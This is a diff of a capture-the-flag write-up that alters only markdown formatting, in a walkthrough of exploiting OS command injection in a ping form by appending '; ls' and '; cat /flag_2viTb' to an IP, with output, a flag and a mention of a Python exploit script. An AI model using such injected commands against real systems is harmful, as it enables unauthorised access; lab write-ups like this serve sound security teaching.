@@ -4,7 +4,7 @@
 
 When we start the instance, we are met with an options menu:
 
-![](../../.gitbook/assets/image%20%2828%29.png)
+![](<../../.gitbook/assets/image (2).png>)
 
 It appears as if we can input the IP, which is then pinged. Let's imagine for a second how this could be implemented on the server side. A common trap developers can fall into is doing something like:
 
@@ -24,7 +24,7 @@ Here, `ls` would be run as a separate command. Let's see if it works!
 
 Let's try it by simply inputting `; ls` to the end of the IP and submitting:
 
-```text
+```
 PING 178.62.0.100 (178.62.0.100): 56 data bytes
 --- 178.62.0.100 ping statistics ---
 4 packets transmitted, 0 packets received, 100% packet loss
@@ -35,7 +35,7 @@ Look - as well as the `ping` command, we get `index.php`, which is the result of
 
 There doesn't appear to be a flag, so we'll try `; ls /` to read the root directory next:
 
-```text
+```
 PING 178.62.0.100 (178.62.0.100): 56 data bytes
 --- 178.62.0.100 ping statistics ---
 4 packets transmitted, 0 packets received, 100% packet loss
@@ -65,7 +65,7 @@ www
 
 Woo - there's a `flag_2viTb` file! Now we'll inject `; cat /flag_2viTb` to read the flag:
 
-```text
+```
 PING 178.62.0.100 (178.62.0.100): 56 data bytes
 --- 178.62.0.100 ping statistics ---
 4 packets transmitted, 0 packets received, 100% packet loss
@@ -93,9 +93,9 @@ data = data.split('</textarea>')[0]
 print(data.strip())
 ```
 
-This simply inputs the command as `cmd`, sets the POST parameters, and \(really messily\) parses the response to return just the data.
+This simply inputs the command as `cmd`, sets the POST parameters, and (really messily) parses the response to return just the data.
 
-```text
+```
 $ python3 exploit.py 
 >> cat /flag_2viTb      
 HTB{I_f1n4lly_l00k3d_thr0ugh_th3_rc3}
@@ -120,4 +120,3 @@ function runTest($test, $ip_address)
 ```
 
 As we guessed, it passed in the input _without sanitising it_ to remove potential injection.
-
